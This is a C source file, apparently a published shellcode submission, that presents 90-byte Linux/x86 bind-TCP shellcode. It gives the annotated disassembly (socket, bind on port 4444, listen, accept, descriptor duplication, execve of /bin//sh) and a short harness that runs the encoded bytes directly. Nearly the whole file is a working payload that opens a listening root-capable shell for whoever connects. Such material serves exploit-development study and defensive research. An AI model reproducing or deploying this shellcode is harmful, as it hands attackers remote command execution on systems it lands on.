/* 
*  Title:    Shell Bind TCP Shellcode - 90 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/shell-bind-tcp-shellcode
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 66                	push   0x66
 8048062:	58                   	pop    eax
 8048063:	6a 01                	push   0x1
 8048065:	5b                   	pop    ebx
 8048066:	31 f6                	xor    esi,esi
 8048068:	56                   	push   esi
 8048069:	53                   	push   ebx
 804806a:	6a 02                	push   0x2
 804806c:	89 e1                	mov    ecx,esp
 804806e:	cd 80                	int    0x80
 8048070:	5f                   	pop    edi
 8048071:	97                   	xchg   edi,eax

08048072 <bind>:
 8048072:	b3 66                	mov    bl,0x66
 8048074:	93                   	xchg   ebx,eax
 8048075:	56                   	push   esi
 8048076:	66 68 11 5c          	pushw  0x5c11
 804807a:	66 53                	push   bx
 804807c:	89 e1                	mov    ecx,esp
 804807e:	6a 10                	push   0x10
 8048080:	51                   	push   ecx
 8048081:	57                   	push   edi
 8048082:	89 e1                	mov    ecx,esp
 8048084:	cd 80                	int    0x80

08048086 <listen>:
 8048086:	b0 66                	mov    al,0x66
 8048088:	b3 04                	mov    bl,0x4
 804808a:	56                   	push   esi
 804808b:	57                   	push   edi
 804808c:	89 e1                	mov    ecx,esp
 804808e:	cd 80                	int    0x80

08048090 <accept>:
 8048090:	b0 66                	mov    al,0x66
 8048092:	43                   	inc    ebx
 8048093:	56                   	push   esi
 8048094:	56                   	push   esi
 8048095:	57                   	push   edi
 8048096:	89 e1                	mov    ecx,esp
 8048098:	cd 80                	int    0x80
 804809a:	93                   	xchg   ebx,eax

0804809b <dup>:
 804809b:	31 c9                	xor    ecx,ecx
 804809d:	b1 02                	mov    cl,0x2

0804809f <dup_loop>:
 804809f:	b0 3f                	mov    al,0x3f
 80480a1:	cd 80                	int    0x80
 80480a3:	49                   	dec    ecx
 80480a4:	79 f9                	jns    804809f <dup_loop>

080480a6 <execve>:
 80480a6:	56                   	push   esi
 80480a7:	b0 0b                	mov    al,0xb
 80480a9:	68 2f 2f 73 68       	push   0x68732f2f
 80480ae:	68 2f 62 69 6e       	push   0x6e69622f
 80480b3:	89 e3                	mov    ebx,esp
 80480b5:	41                   	inc    ecx
 80480b6:	31 d2                	xor    edx,edx
 80480b8:	cd 80                	int    0x80
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\xb3\x66\x93\x56\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x56\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x31\xd2\xcd\x80";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}